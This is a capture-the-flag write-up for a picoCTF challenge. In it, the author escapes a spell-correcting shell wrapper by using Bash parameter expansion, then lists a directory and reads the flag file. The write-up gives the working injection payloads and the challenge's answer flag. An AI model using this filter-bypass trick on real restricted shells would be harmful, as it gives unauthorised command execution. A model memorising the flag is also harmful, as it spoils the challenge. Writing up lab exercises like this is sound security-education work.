# Author: LT 'syreal' Jones

# Description

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)

Start your instance to see connection details.

# Hints

1. Experiment with different shell syntax

# The Problem

The server runs a custom Python wrapper that intercepts user input and applies capitalization and spell-checking before passing it to the system shell. Because Linux commands are case-sensitive, modifying the input (e.g., changing `cat` to `Cat`) prevents standard execution. The vulnerability lies in the wrapper's inability to parse and modify strings wrapped in special characters, allowing for command injection via Bash parameter expansion.

# Steps

1. Connect to the provided instance via SSH.
2. It seems that the standard Linux commands are intercepted and modified by the custom shell.

```bash
Special$ ls
Is 
sh: 1: Is: not found

Special$ cat
Cat 
sh: 1: Cat: not found
```

3. To bypass the text modification filter, I utilized **Bash Parameter Expansion** syntax: `${variable=command}`. The special characters prevented the Python script from capitalizing the text, allowing the underlying shell to execute the command. I started by listing the current directory:

```bash
Special$ ${parameter=ls}
${parameter=ls} 
blargh
```

4. The `ls` command successfully executed, showing a directory named `blargh`. So I list the contents of that directory:

```bash
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
```

5. With flag.txt inside blargh directory, I modified the payload to read the file using `cat` and the correct directory path:

```bash
Special$ ${parameter=cat blargh/flag.txt}
${parameter=cat blargh/flag.txt} 
picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}
```

**Answer:** picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}
